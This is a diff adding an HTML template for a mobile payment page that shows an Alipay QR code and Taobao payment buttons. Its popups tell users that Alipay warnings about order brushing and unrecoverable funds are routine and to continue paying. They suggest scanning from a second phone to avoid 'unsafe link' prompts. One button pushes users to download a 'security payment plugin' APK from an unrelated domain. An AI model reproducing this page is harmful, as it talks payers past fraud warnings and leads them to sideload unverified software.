@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>立即支付</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
+    <link href="__CDN__/assets/css/index.css" rel="stylesheet">
+    <link href="__CDN__/assets/css/index/app.css" rel="stylesheet">
+    <!-- Plugin CSS -->
+    <!--<link href="https://cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <link href="https://cdn.staticfile.org/simple-line-icons/2.4.1/css/simple-line-icons.min.css" rel="stylesheet">-->
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--
+        <script src="https://cdn.staticfile.org/html5shiv/3.7.3/html5shiv.min.js"></script>
+        <script src="https://cdn.staticfile.org/respond.js/1.4.2/respond.min.js"></script>
+    -->
+    <style type="text/css">
+        .bt{
+            color: #0066ff;
+            font-size: larger;
+        }
+        .rt{
+            color:red;
+            font-size: larger;
+        }
+        #page-top{
+            margin: 0 auto;
+            max-width: 640px;
+            min-width: 320px;
+        }
+        .am-button, .am-button.yellow {
+            color: #fff;
+            background-color: #ff5722;
+        }
+        .am-button {
+            /*display: inline-block;
+            width: 100%;
+            position: relative;
+            padding: 0 4px;
+            height: 40px;
+            line-height: 47px;
+            font-size: 18px;
+            text-align: center;
+            box-sizing: border-box;
+            border-radius: 2px;
+            -webkit-background-clip: padding-box;
+            border: 0;*/
+            display: inline-block;
+            width: 100%;
+            position: relative;
+            padding: 0 4px;
+            height: 40px;
+            line-height: 40px;
+            font-size: 14px;
+            text-align: center;
+            box-sizing: border-box;
+            border-radius: 2px;
+            -webkit-background-clip: padding-box;
+            border: 0;
+            margin-bottom: 10px;
+        }
+        #a_plug_pay {
+            margin-top: 10px;
+        }
+        #a_taobao_pay {
+            margin-top: 6px;
+        }
+    </style>
+</head>
+
+<body id="page-top" >
+<div class="container">
+    <div class="container_1">
+        <div class="am-button-wrap" id="orig_link">
+
+            <a class="am-button yellow" id="a_plug_pay" onclick="plug_pay()">立即支付【需装安全控件】</a>
+            <a class="am-button blue" id="a_scan_pay" style="display:none">方式2：支付宝【截图扫码】支付</a>
+            <a class="am-button yellow" onclick="taobao_pay()" id="a_taobao_pay" >有安装【淘宝APP】点此支付</a>
+        </div>
+        <div class="top">
+            截图扫码如跳出【<span class="bt">不安全链接</span>】提示，
+            请用【<span class="bt">另一部手机</span>】的支付宝
+            【<span class="rt">对着扫描</span>】此二维码，成功率【100%】哦
+        </div>
+        <div class="bottom">
+            <div id="code"></div>
+            <!--<img class="img" src="{$qr}"/>-->
+        </div>
+    </div>
+</div>
+<div id="layer" style="display: none">
+    亲爱的会员，请您使用【<span class="bt">截图扫码</span>】支付方式，支付成功率【<span class="bt">100%</span>】哦
+
+    支付过程中如有【<span class="rt">刷单、资金无法撤回</span>】等提示属于支付宝【<span class="rt">正常风控提醒</span>】，
+    请点击【<span class="rt">继续支付</span>】即可完成支付。
+</div>
+
+
+<!-- jQuery -->
+<script src=https://cdn.staticfile.org/jquery/2.1.4/jquery.min.js></script>
+<script src="__CDN__/assets/libs/fastadmin-layer/src/layer.js"></script>
+<script type="text/javascript" src="/assets/js/jquery.qrcode.min.js"></script>
+<!-- Bootstrap Core JavaScript -->
+<script src="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
+<script type="application/javascript">
+    $(document).ready(function(){
+        $('#code').qrcode("{$qr}");
+        layer.confirm(
+            $('#layer').html(),
+            {
+                btn: ['我知道了'], //按钮
+                title:'支付温馨提醒'
+            }, function(){
+                layer.closeAll();
+            });
+        document.body.scrollTop = document.documentElement.scrollTop = 0;
+    });
+
+
+    function plug_pay_tz() {
+
+        var payUrl = '{$qr_url}';
+        var payOrderNo = payUrl.substr(payUrl.indexOf("biz_no=") + "biz_no=".length, "2020010804200323231049871816".length);
+        var pay_data =  'trade_no='+payOrderNo+'&biz_type=share_pp_pay&biz_sub_type=peerpay_trade&presessionid=&app=tb&channel=';
+
+        var s = 'astxq://web/webview?url=' + encodeURIComponent(pay_data);
+        window.location.href = s;
+    }
+
+    function plug_pay() {
+
+        var msgInfo = "亲爱的会员，推荐您使用【<span style='color:red; font-size:16px'> 安全支付插件 </span>】<br/>发起支付，支付成功率【<span style='color:red; font-size:16px'> 100% </span>】哦~<br/><a  class='am-button yellow' style='font-size: 12px'  href='http://ms.doasmoa.cn/yemian/daifu/wx_pay.apk' target='_blank' rel='noreferrer'>未安装【安全支付插件】，点此下载安装</a><br/><span style='color:red; font-size:16px'>一次安装，畅享便捷支付</span>！！！<br/>";
+
+
+        layer.confirm(msgInfo, {
+            icon: 1,
+            title: '支付小提示',
+            btn: ['确认已安装，点击去支付', "返 回"] //按钮
+        }, function (index) {
+            plug_pay_tz();
+        });
+    }
+
+    function taobao_pay() {
+        var msgInfo = "亲爱的会员，推荐您使用【<span style='color:red; font-size:16px'> 淘宝App </span>】<br/>发起支付，支付成功率【<span style='color:red; font-size:16px'> 100% </span>】哦，<br/><br/><a  class='am-button yellow' style='font-size: 12px'  href='http://download.alicdn.com/wireless/taobao4android/latest/702757.apk' target='_blank' rel='noreferrer'>未安装【淘宝APP】，点此下载安装</a><br/><br/><span style='color:red; font-size:16px'>一次安装，畅享便捷支付</span>！！！<br/><br/>";
+
+        layer.confirm(msgInfo, {
+            icon: 1,
+            title: '支付小提示',
+            btn: ['确认已安装，点击去支付', "返 回"] //按钮
+        }, function (index) {
+            location.href = "tbopen://m.taobao.com/tbopen/index.html?source=auto&action=ali.open.nav&module=h5&h5Url=" + encodeURIComponent("{$qr_url}");
+
+            //koubei_pay_tz();
+        });
+
+
+
+
+
+        //location.href = "taobao://www.alipay.com/?appId=10000007&qrcode=http%3A%2F%2Fapi.glcgbhcr.cn%2Fpddb%2Ftdapi.php%3Fc%3DgetXianYuPayStr%26pddname%3Dtdc%26orderNo%3D20200411163216158659393646000";
+
+    }
+
+</script>
+</body>
+
+</html>
+
+
